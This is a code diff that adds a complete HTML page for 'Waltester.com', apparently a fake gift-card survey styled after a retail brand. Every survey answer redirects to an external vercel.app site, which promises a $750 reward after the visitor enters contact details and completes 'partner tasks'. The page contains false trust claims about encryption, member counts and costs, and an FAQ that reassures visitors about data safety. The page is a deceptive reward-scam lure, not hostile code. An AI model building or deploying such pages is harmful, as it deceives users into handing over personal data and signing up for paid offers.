@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#0071ce">
+<title>Waltester.com | Official Website</title>
+<meta name="description" content="Waltester com | The official rewards and product testing website where members review products and earn high-value gift card incentives from trusted brands.">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%230071ce%22/><rect x=%2225%22 y=%2240%22 width=%2250%22 height=%2245%22 rx=%225%22 fill=%22none%22 stroke=%22%23ffffff%22 stroke-width=%228%22/><rect x=%2220%22 y=%2225%22 width=%2260%22 height=%2215%22 rx=%223%22 fill=%22%23ffffff%22/><path d=%22M50 25v60M25 62.5h50%22 stroke=%22%230071ce%22 stroke-width=%226%22/></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  ---blue: #0071ce;
+  ---blue-dark: #0052a6;
+  --brand-blue: #0071ce;
+  --text-main: #111827;
+  --text-muted: #6b7280;
+  --footer-bg: #0f172a;
+}
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter',system-ui,-apple-system,sans-serif}
+html, body {
+  background: #ffffff;
+}
+html {
+  overflow-y: scroll;
+}
+body {
+  color: var(--text-main);
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  line-height: 1.5;
+  overflow-x: hidden;
+}
+.top-bar {
+  background: var(---blue);
+  color: #ffffff;
+  padding: 0.75rem 1.5rem;
+  font-size: 0.95rem;
+  font-weight: 500;
+  text-align: center;
+}
+.top-bar .brand {
+  font-weight: 700;
+  margin-right: 0.25rem;
+}
+.main-content {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-start;
+  align-items: center;
+  padding: 4rem 0 0;
+  background: #ffffff;
+  min-height: calc(100vh - 50px);
+}
+.container {
+  width: 100%;
+  max-width: 420px;
+  background: #ffffff;
+  padding: 1.8rem 1.5rem 1.2rem;
+}
+.question{
+  text-align: center;
+  font-size: 1.25rem;
+  font-weight: 700;
+  margin-bottom: 0.6rem;
+  max-width: 240px;
+  margin-left: auto;
+  margin-right: auto;
+  line-height: 1.35;
+}
+.option{
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  padding: 0.8rem 1.5rem;
+  border-radius: 4px;
+  border: none;
+  background: linear-gradient(90deg, #0071ce, #0052a6);
+  color: #ffffff;
+  font-size: 0.9rem;
+  font-weight: 600;
+  cursor: pointer;
+  margin-bottom: 0.85rem;
+  box-shadow: 0 6px 14px rgba(37, 99, 235, 0.18);
+  transition: background 0.18s ease, transform 0.18s ease, box-shadow 0.18s ease;
+  touch-action: manipulation;
+  -webkit-tap-highlight-color: transparent;
+  user-select: none;
+}
+.option:hover{
+  background: linear-gradient(90deg, #005fb5, #003f86);
+  transform: translateY(-1px);
+  box-shadow: 0 14px 28px rgba(30, 64, 175, 0.3);
+}
+.hidden{display:none}
+.steps{margin-top:10px}
+.step{display:flex;align-items:center;background:#f9fafb;border-radius:10px;padding:14px;margin-bottom:12px;border:1px solid #e5e7eb}
+.step-number{width:28px;height:28px;border-radius:50%;background:var(---blue);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;margin-right:10px;font-size:13px}
+.cta{margin-top:16px;display:inline-flex;align-items:center;justify-content:center;gap:0.35rem;width:100%;background:linear-gradient(90deg, #0071ce, #0052a6);color:#fff;padding:16px;border:none;border-radius:4px;font-size:0.95rem;font-weight:600;cursor:pointer;box-shadow:0 14px 30px rgba(37, 99, 235, 0.4);transition:background 0.18s ease, transform 0.18s ease, box-shadow 0.18s ease}
+.cta:hover{background:linear-gradient(90deg, #005fb5, #003f86);transform:translateY(-1px);box-shadow:0 18px 36px rgba(30, 64, 175, 0.45)}
+.small{text-align:center;font-size:11px;color:var(--text-muted);margin-top:10px}
+.progress-container {
+  margin: 0.5rem auto 1.5rem;
+  width: 100%;
+  max-width: 320px;
+}
+.progress-text {
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 8px;
+  display: flex;
+  justify-content: space-between;
+}
+.progress-bar-bg {
+  width: 100%;
+  height: 8px;
+  background-color: #e5e7eb;
+  border-radius: 999px;
+  overflow: hidden;
+}
+.progress-bar-fill {
+  height: 100%;
+  background-color: var(--brand-blue);
+  width: 25%;
+  border-radius: 999px;
+  transition: width 0.3s ease;
+}
+.extra-content {
+  width: 100%;
+  padding: 1.5rem 1.5rem 3rem;
+  background: transparent;
+}
+.trust-section, .faq-section {
+  width: 100%;
+  max-width: 760px;
+  margin: 0 auto 1.5rem;
+}
+.trust-section h2, .faq-section h2 {
+  text-align: center;
+  font-size: 1.1rem;
+  font-weight: 800;
+  margin-bottom: 1.25rem;
+  color: #0f172a;
+}
+.trust-grid {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 12px;
+  max-width: 760px;
+  margin: 0 auto;
+}
+@media (min-width: 860px) {
+  .trust-grid { grid-template-columns: repeat(4, minmax(0, 1fr)); }
+}
+.trust {
+  background: #fff;
+  border: 1px solid #e2e8f0;
+  border-radius: 12px;
+  box-shadow: 0 4px 12px rgba(2, 24, 71, 0.04);
+  padding: 14px 8px;
+  text-align: center;
+}
+.trust svg {
+  width: 20px;
+  height: 20px;
+  color: var(---blue);
+  margin: 0 auto 8px;
+  display: block;
+}
+.trust strong {
+  display: block;
+  font-size: 12px;
+  font-weight: 800;
+  color: #0f172a;
+}
+.trust span {
+  display: block;
+  margin-top: 3px;
+  font-size: 11px;
+  color: #64748b;
+}
+.faq-list {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.faq-item {
+  background: #ffffff;
+  border-radius: 8px;
+  border: 1px solid #e2e8f0;
+  padding: 10px 12px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+}
+.faq-btn {
+  width: 100%;
+  background: transparent;
+  border: 0;
+  padding: 0;
+  cursor: pointer;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 10px;
+  text-align: left;
+}
+.faq-q {
+  margin: 0;
+  font-weight: 700;
+  font-size: 0.8rem;
+  line-height: 1.35;
+  color: #0f172a;
+}
+.faq-item.open .faq-q {
+  color: var(--brand-blue);
+}
+.faq-chev {
+  width: 14px;
+  height: 14px;
+  color: #64748b;
+  transition: transform 0.15s ease;
+  flex: 0 0 14px;
+}
+.faq-item.open .faq-chev {
+  transform: rotate(180deg);
+}
+.faq-a {
+  margin-top: 8px;
+  color: #64748b;
+  font-size: 0.76rem;
+  line-height: 1.5;
+  display: none;
+}
+.faq-item.open .faq-a {
+  display: block;
+}
+footer {
+  background: var(--footer-bg);
+  color: #9ca3af;
+  font-size: 0.8rem;
+  text-align: center;
+  padding: 1.3rem 1.5rem;
+}
+</style>
+</head>
+<body>
+
+<header class="top-bar">
+  <span class="brand">Waltester Official Survey</span>
+  <span></span>
+</header>
+
+<main class="main-content">
+  <div class="container" id="survey-wrapper">
+
+    <div id="step-one">
+      <h1 class="question">How frequently do you make purchases at our store?</h1>
+      <div class="progress-container">
+        <div class="progress-text">
+          <span>PROGRESS</span>
+          <span id="tracker-text">0/1</span>
+        </div>
+        <div class="progress-bar-bg">
+          <div class="progress-bar-fill" id="tracker-bar" style="width: 0%;"></div>
+        </div>
+      </div>
+      <button class="option" onclick="advanceStep()">Every week</button>
+      <button class="option" onclick="advanceStep()">Several times monthly</button>
+      <button class="option" onclick="advanceStep()">Occasionally as needed</button>
+      <button class="option" onclick="advanceStep()">Hardly ever</button>
+    </div>
+
+    <div id="step-two" class="hidden">
+      <h2 class="question">Which categories do you frequently purchase?</h2>
+      <button class="option" onclick="advanceStep()">Fresh Groceries</button>
+      <button class="option" onclick="advanceStep()">Home Essentials</button>
+      <button class="option" onclick="advanceStep()">Childcare Products</button>
+      <button class="option" onclick="advanceStep()">Tech & Accessories</button>
+    </div>
+
+    <div id="step-three" class="hidden">
+      <h2 class="question" style="color:var(---blue)">Nearly Finished — Redeem Your Bonus</h2>
+
+      <div class="steps">
+        <div class="step"><div class="step-number">1</div>Tap "Redeem Now"</div>
+        <div class="step"><div class="step-number">2</div>Provide your contact details</div>
+        <div class="step"><div class="step-number">3</div>Finish 3–5 partner tasks</div>
+        <div class="step"><div class="step-number">4</div>Get your $750 incentive</div>
+      </div>
+
+      <button class="cta" onclick="processReward()">REDEEM NOW</button>
+
+      <div class="small">Offers are limited. Fresh incentives added daily.</div>
+    </div>
+
+  </div>
+
+  <section class="extra-content">
+    <div class="trust-section">
+      <h2>Why Users Rely On Our Platform</h2>
+      <div class="trust-grid">
+      <div class="trust">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+          <circle cx="9" cy="7" r="4"></circle>
+          <polyline points="16 11 18 13 22 9"></polyline>
+        </svg>
+        <strong>3,500+ Active Members</strong>
+        <span>Real individuals</span>
+      </div>
+
+      <div class="trust">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        <strong>256-bit Encrypted</strong>
+        <span>Secure Gateway</span>
+      </div>
+
+      <div class="trust">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
+        <strong>Zero Surprise</strong>
+        <span>Costs</span>
+      </div>
+
+      <div class="trust">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="2" y="4" width="20" height="16" rx="2"></rect>
+          <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
+        </svg>
+        <strong>Instant Inbox</strong>
+        <span>Delivery</span>
+      </div>
+    </div>
+    </div>
+
+    <div class="faq-section">
+      <h2>Frequently Asked Questions</h2>
+      
+      <div class="faq-list" id="faq-wrapper">
+        <div class="faq-item open">
+          <button class="faq-btn" type="button" aria-expanded="true">
+            <h3 class="faq-q">What exactly is a "deal"?</h3>
+            <svg class="faq-chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <line x1="12" y1="5" x2="12" y2="19"></line>
+              <polyline points="19 12 12 19 5 12"></polyline>
+            </svg>
+          </button>
+          <div class="faq-a">
+            They are basic tasks such as downloading an app, answering a short questionnaire, or signing up for a trial. Each task provides clear instructions before you begin.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-btn" type="button" aria-expanded="false">
+            <h3 class="faq-q">How will I get my payout?</h3>
+            <svg class="faq-chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <line x1="12" y1="5" x2="12" y2="19"></line>
+              <polyline points="19 12 12 19 5 12"></polyline>
+            </svg>
+          </button>
+          <div class="faq-a">
+            Your reward is sent via email once all required tasks are confirmed. Ensure you type your email address correctly during the registration process.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-btn" type="button" aria-expanded="false">
+            <h3 class="faq-q">Is my personal data secure?</h3>
+            <svg class="faq-chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <line x1="12" y1="5" x2="12" y2="19"></line>
+              <polyline points="19 12 12 19 5 12"></polyline>
+            </svg>
+          </button>
+          <div class="faq-a">
+            Absolutely. Our platform utilizes advanced SSL encryption alongside verified partners. Your details are kept strictly confidential.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-btn" type="button" aria-expanded="false">
+            <h3 class="faq-q">Are there any upfront costs?</h3>
+            <svg class="faq-chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <line x1="12" y1="5" x2="12" y2="19"></line>
+              <polyline points="19 12 12 19 5 12"></polyline>
+            </svg>
+          </button>
+          <div class="faq-a">
+            Participation is free of hidden fees. While a few premium offers might require a trial subscription, the vast majority of activities and the core program itself have zero mandatory costs.
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-btn" type="button" aria-expanded="false">
+            <h3 class="faq-q">What's the estimated completion time?</h3>
+            <svg class="faq-chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <line x1="12" y1="5" x2="12" y2="19"></line>
+              <polyline points="19 12 12 19 5 12"></polyline>
+            </svg>
+          </button>
+          <div class="faq-a">
+            Most members successfully complete the required steps in roughly 20 to 30 minutes, depending on the speed at which the tasks are finished.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+</main>
+
+<footer>
+  <p>© 2026 Copyright. All rights reserved.</p>
+</footer>
+
+<script>
+window.localStorage.clear();
+
+window.addEventListener('pageshow', (evt) => {
+  if (evt.persisted || (window.performance && window.performance.navigation.type === 2)) {
+    const mainWrap = document.querySelector('.main-content');
+    if (mainWrap) mainWrap.style.pointerEvents = 'auto';
+    
+    const countDisplay = document.getElementById('tracker-text');
+    const barFill = document.getElementById('tracker-bar');
+    if (countDisplay) countDisplay.textContent = '0/1';
+    if (barFill) barFill.style.width = '0%';
+  }
+});
+
+function advanceStep() {
+  const countDisplay = document.getElementById('tracker-text');
+  const barFill = document.getElementById('tracker-bar');
+  
+  if (countDisplay) countDisplay.textContent = '1/1';
+  if (barFill) barFill.style.width = '100%';
+  
+  const mainWrap = document.querySelector('.main-content');
+  if (mainWrap) mainWrap.style.pointerEvents = 'none';
+
+  setTimeout(() => {
+    window.location.assign("https://waltester-official-program.vercel.app/");
+  }, 101);
+}
+
+function processReward(){
+  window.location.assign("https://waltester-official-program.vercel.app/");
+}
+
+const faqContainer = document.getElementById('faq-wrapper');
+
+const handleFaqToggle = (el, isExpanded) => {
+  el.classList.toggle('open', isExpanded);
+  const button = el.querySelector('.faq-btn');
+  if (button) button.setAttribute('aria-expanded', isExpanded ? 'true' : 'false');
+};
+
+if (faqContainer) {
+  const allFaqs = Array.from(faqContainer.querySelectorAll('.faq-item'));
+  allFaqs.forEach((element, index) => handleFaqToggle(element, index === 0));
+  
+  allFaqs.forEach(currentFaq => {
+    const button = currentFaq.querySelector('.faq-btn');
+    if (button) {
+      button.addEventListener('click', () => {
+        const currentlyOpen = currentFaq.classList.contains('open');
+        allFaqs.forEach(f => handleFaqToggle(f, false));
+        handleFaqToggle(currentFaq, !currentlyOpen);
+      });
+    }
+  });
+}
+</script>
+
+</body>
+</html>
